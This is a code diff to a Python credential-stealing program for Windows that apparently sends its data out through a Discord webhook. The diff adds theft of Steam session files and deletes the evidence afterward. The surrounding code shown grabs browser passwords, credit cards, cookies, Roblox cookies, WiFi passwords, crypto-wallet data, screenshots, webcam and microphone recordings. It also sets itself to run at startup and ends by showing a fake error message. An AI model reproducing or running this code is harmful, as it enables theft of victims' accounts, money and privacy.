@@ -31,7 +31,7 @@ import winreg as wrg
 
 
 
-#Webhookurl goies here dont edit
+webhookurl=''#URL will go here
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -55,21 +55,7 @@ def copy_to_startup():
     except PermissionError as e:
         pass  
 
-def remove_all_zip_files(directory):
-    for item in os.listdir(directory):
-        item_path = os.path.join(directory, item)
-        if os.path.isfile(item_path) and item_path.lower().endswith(".zip"):
-            try:
-                os.remove(item_path)
-            except Exception as e:
-                pass
-        elif os.path.isdir(item_path):
-            try:
-                shutil.rmtree(item_path)
-            except Exception as e:
-                pass
-
-webhook = DiscordWebhook(url=webhookurl)#Set up webhook
+webhook = DiscordWebhook(url=webhookurl[::-1])#Set up webhook
 
 def ip6():#get ipv6
     try:
@@ -184,51 +170,6 @@ def opera_logger():
         print(f"Error occurred in opera_logger: {str(e)}")
         return None  
 roblochrome,robloedge,roblofire,robloopera=chrome_logger(),edge_logger(),firefox_logger(),opera_logger()
-
-def edge_steam():
-    try:
-        scookies = browser_cookie3.edge(domain_name='store.steampowered.com')
-        scookies = str(scookies)
-        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        return scookie, cookie
-    except Exception as e:
-        print(f"Error occurred in edge_logger: {str(e)}")
-        return None, None
-def chrome_steam():
-    try:
-        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
-        scookies = str(scookies)
-        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        return scookie, cookie
-    except Exception as e:
-        print(f"Error occurred in chrome_logger: {str(e)}")
-        return None, None
-def firefox_steam():
-    try:
-        scookies = browser_cookie3.firefox(domain_name='store.steampowered.com')
-        scookies = str(scookies)
-        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        return scookie, cookie
-    except Exception as e:
-        print(f"Error occurred in firefox_logger: {str(e)}")
-        return None, None
-def opera_steam():
-    try:
-        scookies = browser_cookie3.opera(domain_name='store.steampowered.com')
-        scookies = str(scookies)
-        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
-        return scookie, cookie
-    except Exception as e:
-        print(f"Error occurred in opera_logger: {str(e)}")
-        return None, None
-edge_steam_cookie, edge_session_cookie = edge_steam()
-chrome_steam_cookie, chrome_session_cookie = chrome_steam()
-firefox_steam_cookie, firefox_session_cookie = firefox_steam()
-opera_steam_cookie, opera_session_cookie = opera_steam()
 
 def sysinfo():
     location = wrg.HKEY_LOCAL_MACHINE
@@ -354,7 +295,7 @@ def cookies():
          pass    
     return filedata                            
 def zipfolder():
-    folder_name = "my_folder"
+    folder_name = f'{os.environ["TEMP"]}\\LocalCache'
     if not os.path.exists(folder_name):
         os.makedirs(folder_name)
 
@@ -378,13 +319,32 @@ def zipfolder():
     with open(file_path, 'w', encoding='utf-8') as file:
         file.write(SavedChromepass())
 
-    # Zip the folder and its contents
+
+
     zip_file_path = folder_name + ".zip"
     with zipfile.ZipFile(zip_file_path, 'w') as zipf:
         for root, _, files in os.walk(folder_name):
             for file in files:
                 file_path = os.path.join(root, file)
                 zipf.write(file_path, os.path.relpath(file_path, folder_name))
+
+
+
+    if os.path.exists(folder_name) and os.path.isdir(folder_name):
+     # List all files and subdirectories in the directory
+     for item in os.listdir(folder_name):
+        item_path = os.path.join(folder_name, item)
+        
+        # Check if it's a file and not a subdirectory
+        if os.path.isfile(item_path):
+            try:
+                # Delete the file
+                os.remove(item_path)
+                print(f"Deleted: {item_path}")
+            except Exception as e:
+                print(f"Error deleting {item_path}: {str(e)}")
+    else:
+     print(f"Directory {folder_name} does not exist or is not a directory.")
 
     return zip_file_path
     
@@ -859,8 +819,37 @@ def discordinfo():
     except Exception as e:
         print(f"An error occurred: {e}")    
 
+def steamssfnconfig():
+    steam_path = ""
+    if os.path.exists(os.environ["PROGRAMFILES(X86)"] + "\\steam"):
+        steam_path = os.environ["PROGRAMFILES(X86)"] + "\\steam"
+        ssfn = []
+        config = ""
+        for file in os.listdir(steam_path):
+            if file[:4] == "ssfn":
+                ssfn.append(steam_path + f"\\{file}")
 
+        def steam(path, path1, steam_session):
+            for root, dirs, file_name in os.walk(path):
+                for file in file_name:
+                    steam_session.write(root + "\\" + file)
+            for file2 in path1:
+                steam_session.write(file2)
 
+        if os.path.exists(steam_path + "\\config"):
+            with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip", 'w', zipfile.ZIP_DEFLATED) as zp:
+                steam(steam_path + "\\config", ssfn, zp)
+
+        file = open(f"{os.environ['TEMP']}\\steam_session.zip", "rb")
+        webhook.add_file(file.read(), 'steamssfn+config.zip')
+        file.close()
+
+        try:
+            os.remove(f"{os.environ['TEMP']}\\steam_session.zip")
+
+        except:
+            pass
+steamssfnconfig()
     
     
    
@@ -871,8 +860,6 @@ micthread=threading.Thread(target=record_audio)
 geolocationembed=DiscordEmbed(title='IP and Geolocation Data',description=f'```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
 sysembed=DiscordEmbed(title='System Information',description=f'### System Info:',color='ab222b')
-steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
-steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
 discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='### Tokens:\n')
 discordtokeninfoembed= DiscordEmbed()
 
@@ -884,8 +871,15 @@ try:
     
  with open(zipfolder(),'rb') as file:
        webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
+       print(f'removing {zipfolder()}')
+       try:
+           file.close()
+           os.remove(zipfolder())
+           print('removed zip folder')
+       except Exception as e:
+        print(f"Error removing file: {str(e)}")    
 except PermissionError as e:
-    errorembed = DiscordEmbed(title='Permission error to access the browserfiles',description='```Victim needs computer shutdown for restrictions to be lifted```')
+    errorembed = DiscordEmbed(title='Permission error to access the Saved browser files',description='```Victim needs computer shutdown for restrictions to be lifted```')
     webhook.add_embed(errorembed)   
 
 tokenamt=0 
@@ -909,23 +903,22 @@ if wifi:
     wifi_embed = DiscordEmbed(title='WiFi Passwords',description='### Wifi SSID and passwords', color=65280)  # Green color
     for ssid, password in wifi.items():
         password = f'```{password}```'
-        wifiembed.add_embed_field(name=ssid, value=password)
+        wifi_embed.add_embed_field(name=ssid, value=password)
+    
 
 webhook.add_embed(sysembed) 
-webhook.add_embed(wifiembed)
+webhook.add_embed(wifi_embed)
 webhook.add_embed(geolocationembed)
 webhook.add_embed(robloxembed)
-webhook.add_embed(steamloginembed)
-webhook.add_embed(steamsesembed)
 webhook.add_embed(discordtokenembed)
 
 screenie()#screenshots the users screen(s)  
 exo()#get exodus cryptowallet Appdata and adds the zip to webhook
- 
+
 webcamthread.join()
 micthread.join()
 
-#remove_all_zip_files(os.path.dirname(sys.executable)) 
+print('sent webhook')
 webhook.execute()
 ctypes.windll.user32.MessageBoxW(0, "Error 99: Please try again later", "An error as occured", 1)
 #if not os.path.realpath(sys.executable) == startup_script_path:
